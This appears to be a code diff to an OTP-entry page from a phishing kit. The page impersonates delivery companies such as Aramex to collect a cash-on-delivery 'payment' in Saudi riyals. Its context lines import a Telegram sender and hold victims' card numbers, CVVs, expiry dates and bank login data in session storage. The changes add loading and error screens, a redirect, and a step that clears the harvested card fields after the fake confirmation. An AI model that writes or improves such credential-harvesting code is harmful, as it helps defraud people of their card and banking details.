@@ -5,6 +5,7 @@ import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
+import FullScreenLoader from "@/components/FullScreenLoader";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -13,7 +14,7 @@ const PaymentOTPForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
   
   const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
   const [attempts, setAttempts] = useState(0);
@@ -24,17 +25,40 @@ const PaymentOTPForm = () => {
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+
+  if (isLoading) {
+    return <FullScreenLoader label="جاري تجهيز التحقق بخطوتين..." />;
+  }
+
+  if (!linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <Shield className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
+          <h2 className="text-lg font-semibold mb-2">تعذر تحميل بيانات التحقق</h2>
+          <p className="text-sm text-muted-foreground">الرجاء التحقق من الرابط أو إعادة المحاولة لاحقاً.</p>
+        </div>
+      </div>
+    );
+  }
+
+  const payload = (linkData.payload ?? {}) as Record<string, any>;
+  const serviceKey = payload.service_key || customerInfo.service || 'aramex';
+  const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  
-  const shippingInfo = linkData?.payload as any;
-  const amount = shippingInfo?.cod_amount || 500;
+  const amount = payload?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
   
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    if (!method) {
+      navigate(`/pay/${id}/track`);
+    }
+  }, [id, navigate]);
+
   // Countdown timer effect
   useEffect(() => {
     if (countdown > 0) {
@@ -208,6 +232,18 @@ const PaymentOTPForm = () => {
         description: "تم تأكيد الدفع بنجاح",
       });
       
+      sessionStorage.removeItem('paymentMethod');
+      sessionStorage.removeItem('selectedBank');
+      sessionStorage.removeItem('selectedCountry');
+      sessionStorage.removeItem('customerInfo');
+      sessionStorage.removeItem('cardName');
+      sessionStorage.removeItem('cardNumber');
+      sessionStorage.removeItem('cardLast4');
+      sessionStorage.removeItem('cardExpiry');
+      sessionStorage.removeItem('cardCvv');
+      sessionStorage.removeItem('cardType');
+      sessionStorage.removeItem('bankLoginData');
+
       navigate(`/pay/${id}/receipt`);
     } else {
       const newAttempts = attempts + 1;
